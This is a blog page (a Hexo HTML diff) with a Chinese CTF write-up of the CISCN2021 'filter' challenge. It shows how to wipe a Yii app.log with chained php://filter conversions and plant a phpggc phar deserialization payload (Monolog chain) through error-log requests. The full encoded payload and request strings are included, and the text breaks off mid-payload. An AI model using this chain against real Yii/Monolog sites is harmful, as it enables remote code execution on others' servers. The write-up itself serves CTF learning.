@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"123-prog.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="0x01给了site控制器的源码，就改了index方法的那一部分">
+<meta property="og:type" content="article">
+<meta property="og:title" content="(CISCN2021 Quals)filter">
+<meta property="og:url" content="https://123-prog.github.io/2021/08/05/CISCN2021-Quals-filter/index.html">
+<meta property="og:site_name" content="nappingCat&#39;s Blog">
+<meta property="og:description" content="0x01给了site控制器的源码，就改了index方法的那一部分">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://123-prog.github.io/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-06_17-34-11.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-05_13-54-41.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-05_13-59-37.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-05_21-14-45.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-06_17-45-48.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-06_23-50-10.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-07_00-04-09.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-07_00-07-51.png">
+<meta property="og:image" content="https://123-prog.github.io/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-07_00-13-47.png">
+<meta property="article:published_time" content="2021-08-05T02:42:14.000Z">
+<meta property="article:modified_time" content="2021-08-07T10:05:18.322Z">
+<meta property="article:author" content="nappingCat">
+<meta property="article:tag" content="phar反序列化">
+<meta property="article:tag" content="php:&#x2F;&#x2F;filter过滤器巧妙利用">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://123-prog.github.io/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-06_17-34-11.png">
+
+<link rel="canonical" href="https://123-prog.github.io/2021/08/05/CISCN2021-Quals-filter/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>(CISCN2021 Quals)filter | nappingCat's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">nappingCat's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://123-prog.github.io/2021/08/05/CISCN2021-Quals-filter/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="nappingCat">
+      <meta itemprop="description" content="2571374157@qq.com">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="nappingCat's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          (CISCN2021 Quals)filter
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-08-05 10:42:14" itemprop="dateCreated datePublished" datetime="2021-08-05T10:42:14+08:00">2021-08-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-08-07 18:05:18" itemprop="dateModified" datetime="2021-08-07T18:05:18+08:00">2021-08-07</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">web刷题记录</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>给了<code>site</code>控制器的源码，就改了index方法的那一部分</p>
+<a id="more"></a>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionIndex</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$file</span> = Yii::<span class="variable">$app</span>-&gt;request-&gt;get(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">       <span class="variable">$res</span> = file_get_contents(<span class="variable">$file</span>);</span><br><span class="line">       file_put_contents(<span class="variable">$file</span>,<span class="variable">$res</span>);</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>读取文件内容，再将读取到的内容写到文件中，看似我们无法控制其中的内容，实际上可以通过<code>php://filter</code>过滤数据，再通过巧妙地构造实现在指定文件中写入想要的内容，具体看下面</p>
+<p>首先，需要知道一个目标文件路径</p>
+<p>根据提示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;log&#x27;</span> =&gt; [</span><br><span class="line">           <span class="string">&#x27;traceLevel&#x27;</span> =&gt; YII_DEBUG ? <span class="number">0</span> : <span class="number">0</span>,</span><br><span class="line">           <span class="string">&#x27;targets&#x27;</span> =&gt; [</span><br><span class="line">               [</span><br><span class="line">                   <span class="string">&#x27;class&#x27;</span> =&gt; <span class="string">&#x27;yii\log\FileTarget&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;levels&#x27;</span> =&gt; [<span class="string">&#x27;error&#x27;</span>],</span><br><span class="line">                   <span class="string">&#x27;logVars&#x27;</span> =&gt; [],</span><br><span class="line">               ],</span><br><span class="line">           ],</span><br><span class="line">       ],</span><br></pre></td></tr></table></figure>
+<p><code>&#39;class&#39; =&gt; &#39;yii\log\FileTarget&#39;</code>指定日志使用文件存储，没有指定存储目标文件，默认在目录</p>
+<p><code>/runtime/logs/app.log</code></p>
+<p><img src="/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-06_17-34-11.png"></p>
+<p>目标文件就是这个日志文件</p>
+<h3 id="0x02-php-filter清空文件内容"><a href="#0x02-php-filter清空文件内容" class="headerlink" title="0x02 php://filter清空文件内容"></a>0x02 php://filter清空文件内容</h3><p>首先，清空主要是利用<code>convert.base64-decode</code>解码的时候会先将非base64编码表里面的字符清除，只要将日志的内容转换为非base64编码表中的字符，就可以实现清除的目的</p>
+<p>利用转化编码的方式可以将日志中的字符转换成一些编码值较大的字符，这些字符不会出现在base64编码表中</p>
+<p>主要的<code>filter</code>过滤流为</p>
+<p><code>php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log</code>，通过<code>file_put_contents()</code>将读出的数据通过write流（得到空）再写入文件</p>
+<p>分析：</p>
+<ol>
+<li><code>convert.iconv.utf-8.utf-16be</code>可以将字符的编码从<code>utf-8转换到utf-16be</code>，be代表大端序，对应le代表小端序，比如，utf-8下的<code>t</code>对应<code>74</code>，经过这一转换，就变成了<code>0074</code>  <img src="/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-05_13-54-41.png"></li>
+<li><code>convert.quoted-printable-encode</code>，打印出所有字符，包括不可见字符，会穿插等于号在其中作为标志，为什么要用这个呢，下面看一下，经过这个流打印出的字符，已经没有不可见字符，而且观察一下，如果作为utf-16来看，两个字节一个字符，这些表示的字符编码值都很高，会是一些语言符号，可能是中文或者其他语言，但它都不会在base64编码表里<img src="/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-05_13-59-37.png"></li>
+<li>将上面得到的字符再做个编码转换，回到<code>utf-8</code>，<code>convert.iconv.utf-16be.utf-8</code>，会得到这些字符<img src="/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-05_21-14-45.png"></li>
+<li>最后base64-decode直接清空</li>
+</ol>
+<p>其实多次<code>base64-decode</code>也是可以清空的</p>
+<h3 id="0x03-构造phar触发反序列化"><a href="#0x03-构造phar触发反序列化" class="headerlink" title="0x03 构造phar触发反序列化"></a>0x03 构造phar触发反序列化</h3><p>我们可以在日志控制的部分，无非就是某个不存在的目录或文件参数，我们访问这个不存在的参数，这题<code>file</code>参数就是这样的参数，如果给出不存在的路径，自然会在日志中反映出来</p>
+<p>在本地搭个环境，利用<code>composer</code>搭</p>
+<p>然后把本地环境的配置改一下，控制器改一下，改成跟题目一致就可以了</p>
+<h5 id="给出一个不存在参数"><a href="#给出一个不存在参数" class="headerlink" title="给出一个不存在参数"></a>给出一个不存在参数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?r&#x3D;site&#x2F;index&amp;file&#x3D;PPOOCC</span><br></pre></td></tr></table></figure>
+<p>日志中出现一条错误信息</p>
+<p><img src="/2021/08/05/CISCN2021-Quals-filter/Snipaste_2021-08-06_17-45-48.png"></p>
+<p>有两处可以出现我们的payload，但这里的第二处栈信息中，只会显示15个字符，超过直接省略号给你省略了，这里是一个点需要注意的，这里的省略需要做处理，否则截断在第15个字符，可能对后面的解码转码造成影响</p>
+<p>下面开始消除日志payload外的其他字符，方法是，<strong>对payload进行编码转码后再插入，然后在对payload进行还原的同时，清除其他字符</strong></p>
+<p>读取流可以是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-decode|convert.iconv.utf-16be.utf-8|convert.base64-decode&#x2F;resource&#x3D;..&#x2F;runtime&#x2F;logs&#x2F;app.log</span><br></pre></td></tr></table></figure>
+<p>可以试一下，经过<code>convert.quoted-printable-decode|convert.iconv.utf-16be.utf-8</code>会出现所谓的乱码，再base64-decode可以清除日志中的其他内容，接下来处理payload</p>
+<p>对payload的处理就是上面的逆处理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode|convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode&#x2F;resource&#x3D;payload.txt</span><br></pre></td></tr></table></figure>
+<p><strong>注意这里还有些细节要处理，并不是直接将payload插进去就完事,注意以下几点</strong></p>
+<blockquote>
+<p>流处理过程中<strong>不能报错</strong>，因为报错信息会写进日志，对我们构造的phar文件造成影响</p>
+<p>1.<code>convert.quoted-printable-decode</code>，=是这个处理的特殊符号，在除了payload触发点的其他地方出现，都可能引起报错，如果日志本身出现了=，那么估计只能另作考虑，不用这个了，但幸好，日志记录的内容除了我们的payload以外，并没有=</p>
+<p>2.可能你已经注意到了，上面的日志示例，有两处可以出现payload，第二处15个字符截断，如果截断在=后面或者=后面只留一个数字，那么也是会报错的，所以这里的处理是，在payload前面添加长度&gt;=15的字符串，这样日志里面就只有一处payload了</p>
+<p>3.<code>convert.iconv.utf-16be.utf-8</code>，它会将log中的内容进行编码转换，utf-16以两个字节为一个字符，所以我们log里面的字节数必须为<strong>偶数</strong>，不然也会报错，除此之外，<strong>我们的payload的第一个字节在转换编码为utf-8的时候必须和payload的第二个字节“凑一对”，而不是和payload前面的那一个字符“凑一对”</strong>，想一想就知道，第一个字节让抢了，我们的payload完整性不就没了，不就无法复原了，所以我们还要保证payload前面的字节数为偶数</p>
+<p>前面的还好，就第三点比较麻烦，我们可以这样操作</p>
+<p>先发送一个请求，在log中留下一个记录，file&gt;=15，将第二个payload点去除，方便我们控字节数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r&#x3D;site&#x2F;index&amp;file&#x3D;xxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure>
+
+<p>再发一个携带payload的请求，在log中留下payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r&#x3D;site&#x2F;index&amp;file&#x3D;xxxxxxxxxxxxxxx%3D00P%3D00D%3D009%3D00w%3D00a%3D00H%3D00A%3D00g%3D00X%3D001%3D009%3D00I%3D00Q%3D00U%3D00x%3D00U%3D00X%3D000%3D00N%3D00P%3D00T%3D00V%3D00B%3D00J%3D00T%3D00E%3D00V%3D00S%3D00K%3D00C%3D00k%3D007%3D00I%3D00D%3D008%3D00%2B%3D00D%3D00Q%3D00q%3D00v%3D00A%3D00Q%3D00A%3D00A%3D00A%3D00g%3D00A%3D00A%3D00A%3D00B%3D00E%3D00A%3D00A%3D00A%3D00A%3D00B%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00B%3D00Y%3D00A%3D00Q%3D00A%3D00A%3D00T%3D00z%3D00o%3D00z%3D00M%3D00j%3D00o%3D00i%3D00%3D0A%3D00T%3D00W%3D009%3D00u%3D00b%3D002%3D00x%3D00v%3D00Z%3D001%3D00x%3D00I%3D00Y%3D00W%3D005%3D00k%3D00b%3D00G%3D00V%3D00y%3D00X%3D00F%3D00N%3D005%3D00c%3D002%3D00x%3D00v%3D00Z%3D001%3D00V%3D00k%3D00c%3D00E%3D00h%3D00h%3D00b%3D00m%3D00R%3D00s%3D00Z%3D00X%3D00I%3D00i%3D00O%3D00j%3D00E%3D006%3D00e%3D003%3D00M%3D006%3D00O%3D00T%3D00o%3D00i%3D00A%3D00C%3D00o%3D00A%3D00c%3D002%3D009%3D00j%3D00a%3D002%3D00V%3D000%3D00I%3D00j%3D00t%3D00P%3D00O%3D00j%3D00I%3D005%3D00%3D0A%3D00O%3D00i%3D00J%3D00N%3D00b%3D002%3D005%3D00v%3D00b%3D00G%3D009%3D00n%3D00X%3D00E%3D00h%3D00h%3D00b%3D00m%3D00R%3D00s%3D00Z%3D00X%3D00J%3D00c%3D00Q%3D00n%3D00V%3D00m%3D00Z%3D00m%3D00V%3D00y%3D00S%3D00G%3D00F%3D00u%3D00Z%3D00G%3D00x%3D00l%3D00c%3D00i%3D00I%3D006%3D00N%3D00z%3D00p%3D007%3D00c%3D00z%3D00o%3D00x%3D00M%3D00D%3D00o%3D00i%3D00A%3D00C%3D00o%3D00A%3D00a%3D00G%3D00F%3D00u%3D00Z%3D00G%3D00x%3D00l%3D00c%3D00i%3D00I%3D007%3D00c%3D00j%3D00o%3D00y%3D00%3D0A%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00M%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00G%3D00J%3D001%3D00Z%3D00m%3D00Z%3D00l%3D00c%3D00l%3D00N%3D00p%3D00e%3D00m%3D00U%3D00i%3D00O%3D002%3D00k%3D006%3D00L%3D00T%3D00E%3D007%3D00c%3D00z%3D00o%3D005%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00i%3D00d%3D00W%3D00Z%3D00m%3D00Z%3D00X%3D00I%3D00i%3D00O%3D002%3D00E%3D006%3D00M%3D00T%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D002%3D00E%3D006%3D00M%3D00j%3D00p%3D007%3D00%3D0A%3D00a%3D00T%3D00o%3D00w%3D00O%3D003%3D00M%3D006%3D00N%3D00j%3D00o%3D00i%3D00d%3D002%3D00h%3D00v%3D00Y%3D00W%3D001%3D00p%3D00I%3D00j%3D00t%3D00z%3D00O%3D00j%3D00U%3D006%3D00I%3D00m%3D00x%3D00l%3D00d%3D00m%3D00V%3D00s%3D00I%3D00j%3D00t%3D00O%3D00O%3D003%3D001%3D009%3D00c%3D00z%3D00o%3D004%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00s%3D00Z%3D00X%3D00Z%3D00l%3D00b%3D00C%3D00I%3D007%3D00T%3D00j%3D00t%3D00z%3D00O%3D00j%3D00E%3D000%3D00O%3D00i%3D00I%3D00A%3D00%3D0A%3D00K%3D00g%3D00B%3D00p%3D00b%3D00m%3D00l%3D000%3D00a%3D00W%3D00F%3D00s%3D00a%3D00X%3D00p%3D00l%3D00Z%3D00C%3D00I%3D007%3D00Y%3D00j%3D00o%3D00x%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00Q%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00G%3D00J%3D001%3D00Z%3D00m%3D00Z%3D00l%3D00c%3D00k%3D00x%3D00p%3D00b%3D00W%3D00l%3D000%3D00I%3D00j%3D00t%3D00p%3D00O%3D00i%3D000%3D00x%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00M%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00H%3D00B%3D00y%3D00%3D0A%3D00b%3D002%3D00N%3D00l%3D00c%3D003%3D00N%3D00v%3D00c%3D00n%3D00M%3D00i%3D00O%3D002%3D00E%3D006%3D00M%3D00j%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D003%3D00M%3D006%3D00N%3D00z%3D00o%3D00i%3D00Y%3D003%3D00V%3D00y%3D00c%3D00m%3D00V%3D00u%3D00d%3D00C%3D00I%3D007%3D00a%3D00T%3D00o%3D00x%3D00O%3D003%3D00M%3D006%3D00N%3D00j%3D00o%3D00i%3D00c%3D003%3D00l%3D00z%3D00d%3D00G%3D00V%3D00t%3D00I%3D00j%3D00t%3D009%3D00f%3D00X%3D000%3D00F%3D00A%3D00A%3D00A%3D00A%3D00%3D0A%3D00Z%3D00H%3D00V%3D00t%3D00b%3D00X%3D00k%3D00E%3D00A%3D00A%3D00A%3D00A%3D00Z%3D00D%3D00s%3D00N%3D00Y%3D00Q%3D00Q%3D00A%3D00A%3D00A%3D00A%3D00M%3D00f%3D00n%3D00%2F%3D00Y%3D00p%3D00A%3D00E%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00I%3D00A%3D00A%3D00A%3D00A%3D00d%3D00G%3D00V%3D00z%3D00d%3D00C%3D005%3D000%3D00e%3D00H%3D00Q%3D00E%3D00A%3D00A%3D00A%3D00A%3D00Z%3D00D%3D00s%3D00N%3D00Y%3D00Q%3D00Q%3D00A%3D00A%3D00A%3D00A%3D00M%3D00f%3D00n%3D00%2F%3D00Y%3D00%3D0A%3D00p%3D00A%3D00E%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00B%3D000%3D00Z%3D00X%3D00N%3D000%3D00d%3D00G%3D00V%3D00z%3D00d%3D00F%3D00D%3D00o%3D00y%3D00y%3D00f%3D00f%3D00m%3D003%3D00M%3D004%3D00B%3D00r%3D001%3D00c%3D00K%3D00C%3D00e%3D001%3D008%3D007%3D00Q%3D00C%3D00M%3D00Y%3D008%3D00e%3D00A%3D00g%3D00A%3D00A%3D00A%3D00E%3D00d%3D00C%3D00T%3D00U%3D00I%3D00%3D3D%3D00%3D0A</span><br></pre></td></tr></table></figure>
+
+<p>payload前面可以插入&gt;=15的任意数量的字符</p>
+<p>现在可以分析，如何控字节数，我们发了两个请求，所以除去我们的payload部分，已经是偶数了，<strong>只要保证第一次请求的payload和第二次请求的payload加起来的字符数为偶数即可</strong>，就可以满足log中字节数为偶数的条件</p>
+<p>我们可以控制的是第一个payload的长度，和 第二个payload前面字符的长度，而第二个payload有效部分已经是偶数了，所以简化成第一个payload加上第二个payload前面额外添加的字符数为偶数</p>
+<p>还有一个条件，我们有效payload前面的字节数需要为偶数，在满足前面所有条件的情况下，我们可以在第二个payload<strong>首尾各添加n个字符实现</strong>，这样既不会影响全体奇偶性，也可以改变有效payload前面字符数的奇偶</p>
+</blockquote>
+<h3 id="0x04-构造payload解题"><a href="#0x04-构造payload解题" class="headerlink" title="0x04 构造payload解题"></a>0x04 构造payload解题</h3><p>下面是本地测试，实际做题可能由于环境不同需要做出改变</p>
+<p><strong>首先清空日志</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode&#x2F;resource&#x3D;..&#x2F;runtime&#x2F;logs&#x2F;app.log</span><br></pre></td></tr></table></figure>
+<p><strong>发出第一个出错请求</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r&#x3D;site&#x2F;index&amp;file&#x3D;xxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure>
+<p>通过phpggc生成phar，再经过上面的处理可以获取有效payload</p>
+<p><strong>发出第二个出错请求，插入payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r&#x3D;site&#x2F;index&amp;file&#x3D;xxxxxxxxxxxxxxx%3D00P%3D00D%3D009%3D00w%3D00a%3D00H%3D00A%3D00g%3D00X%3D001%3D009%3D00I%3D00Q%3D00U%3D00x%3D00U%3D00X%3D000%3D00N%3D00P%3D00T%3D00V%3D00B%3D00J%3D00T%3D00E%3D00V%3D00S%3D00K%3D00C%3D00k%3D007%3D00I%3D00D%3D008%3D00%2B%3D00D%3D00Q%3D00q%3D00v%3D00A%3D00Q%3D00A%3D00A%3D00A%3D00g%3D00A%3D00A%3D00A%3D00B%3D00E%3D00A%3D00A%3D00A%3D00A%3D00B%3D00A%3D00A%3D00A%3D00A%3D00A%3D00A%3D00B%3D00Y%3D00A%3D00Q%3D00A%3D00A%3D00T%3D00z%3D00o%3D00z%3D00M%3D00j%3D00o%3D00i%3D00T%3D00W%3D009%3D00u%3D00b%3D002%3D00x%3D00v%3D00Z%3D001%3D00x%3D00I%3D00Y%3D00W%3D005%3D00k%3D00b%3D00G%3D00V%3D00y%3D00X%3D00F%3D00N%3D005%3D00c%3D002%3D00x%3D00v%3D00Z%3D001%3D00V%3D00k%3D00c%3D00E%3D00h%3D00h%3D00b%3D00m%3D00R%3D00s%3D00Z%3D00X%3D00I%3D00i%3D00O%3D00j%3D00E%3D006%3D00e%3D003%3D00M%3D006%3D00O%3D00T%3D00o%3D00i%3D00A%3D00C%3D00o%3D00A%3D00c%3D002%3D009%3D00j%3D00a%3D002%3D00V%3D000%3D00I%3D00j%3D00t%3D00P%3D00O%3D00j%3D00I%3D005%3D00O%3D00i%3D00J%3D00N%3D00b%3D002%3D005%3D00v%3D00b%3D00G%3D009%3D00n%3D00X%3D00E%3D00h%3D00h%3D00b%3D00m%3D00R%3D00s%3D00Z%3D00X%3D00J%3D00c%3D00Q%3D00n%3D00V%3D00m%3D00Z%3D00m%3D00V%3D00y%3D00S%3D00G%3D00F%3D00u%3D00Z%3D00G%3D00x%3D00l%3D00c%3D00i%3D00I%3D006%3D00N%3D00z%3D00p%3D007%3D00c%3D00z%3D00o%3D00x%3D00M%3D00D%3D00o%3D00i%3D00A%3D00C%3D00o%3D00A%3D00a%3D00G%3D00F%3D00u%3D00Z%3D00G%3D00x%3D00l%3D00c%3D00i%3D00I%3D007%3D00c%3D00j%3D00o%3D00y%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00M%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00G%3D00J%3D001%3D00Z%3D00m%3D00Z%3D00l%3D00c%3D00l%3D00N%3D00p%3D00e%3D00m%3D00U%3D00i%3D00O%3D002%3D00k%3D006%3D00L%3D00T%3D00E%3D007%3D00c%3D00z%3D00o%3D005%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00i%3D00d%3D00W%3D00Z%3D00m%3D00Z%3D00X%3D00I%3D00i%3D00O%3D002%3D00E%3D006%3D00M%3D00T%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D002%3D00E%3D006%3D00M%3D00j%3D00p%3D007%3D00a%3D00T%3D00o%3D00w%3D00O%3D003%3D00M%3D006%3D00N%3D00j%3D00o%3D00i%3D00d%3D002%3D00h%3D00v%3D00Y%3D00W%3D001%3D00p%3D00I%3D00j%3D00t%3D00z%3D00O%3D00j%3D00U%3D006%3D00I%3D00m%3D00x%3D00l%3D00d%3D00m%3D00V%3D00s%3D00I%3D00j%3D00t%3D00O%3D00O%3D003%3D001%3D009%3D00c%3D00z%3D00o%3D004%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00s%3D00Z%3D00X%3D00Z%3D00l%3D00b%3D00C%3D00I%3D007%3D00T%3D00j%3D00t%3D00z%3D00O%3D00j%3D00E%3D000%3D00O%3D00i%3D00I%3D00A%3D00K%3D00g%3D00B%3D00p%3D00b%3D00m%3D00l%3D000%3D00a%3D00W%3D00F%3D00s%3D00a%3D00X%3D00p%3D00l%3D00Z%3D00C%3D00I%3D007%3D00Y%3D00j%3D00o%3D00x%3D00O%3D003%3D00M%3D006%3D00M%3D00T%3D00Q%3D006%3D00I%3D00g%3D00A%3D00q%3D00A%3D00G%3D00J%3D001%